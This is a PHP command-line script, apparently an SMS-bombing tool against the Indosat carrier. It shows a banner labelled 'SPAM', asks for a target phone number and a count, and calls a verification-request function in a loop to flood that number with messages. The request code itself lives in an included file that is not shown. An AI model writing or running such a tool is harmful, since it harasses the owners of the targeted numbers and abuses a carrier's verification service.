<?php
include "Indosat.php";
$H = "\e[91m";
$G = "\e[92m";
$K = "\e[93m";
$B = "\e[94m";
$P = "\e[0m";
$init = new Bom();
echo "\n$G###################################\n";
echo " $H ()==={/}$P=======$H>>\n";
echo " $G   DIE :$K DEDE\n";
echo " $G   TIP :$K SPAM\n";
echo " $G   SMS :$K INDOSAT\n";
echo " $H ()==={/}$P=======$H>>\n";
echo "$G###################################\n";
print("$P===================================\n");
echo " $K Nomer Target:$P ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo " $K Jumlah Paket:$P ";
$b = trim(fgets(STDIN));
print("$P===================================\n");
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}
?>